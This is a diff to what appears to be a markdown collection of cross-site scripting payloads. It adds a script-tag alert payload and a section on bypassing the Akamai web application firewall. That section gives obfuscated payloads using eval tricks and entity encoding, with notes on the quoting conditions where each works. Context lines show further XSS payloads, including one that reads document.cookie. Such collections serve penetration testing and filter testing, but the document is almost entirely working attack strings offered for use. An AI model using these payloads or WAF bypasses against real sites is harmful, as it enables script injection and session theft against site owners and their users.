@@ -58,6 +58,7 @@ TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt;
 %<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e
 <input disabled=disabled onbeforecopy=alert(1) value=copyme>
 </textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
+</script><script>alert('xElkomy')</script>
 ```
 
 ## XSS payload with Alert Obfuscation, for bypass RegEx filters
@@ -102,3 +103,20 @@ window&&=(window&&=opener||=alert)?.(1??0,)
 "type%3d"text"autofocus%20onfocus%3d"alert(1)"
 ```
 -> Works
+
+## Akami WAF XSS Bypass
+```js
+xhzeem*/eval?.(value+/()/.source)//"><input value=confirm autofocus onfocus='/*"
+```
+![img](https://pbs.twimg.com/media/EyDDoO7WYAEJMr6?format=jpg&name=small)
+
+Limited case Akamai WAF bypass
+
+<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
+
+Works in cases where double quotes are escaped 
+
+`<xhzeem/x=\" ....>`
+
+can also work with single quotes (change it in the payload)
+![img](https://pbs.twimg.com/media/Ex-cjUQXIAIRw-y?format=jpg&name=small)
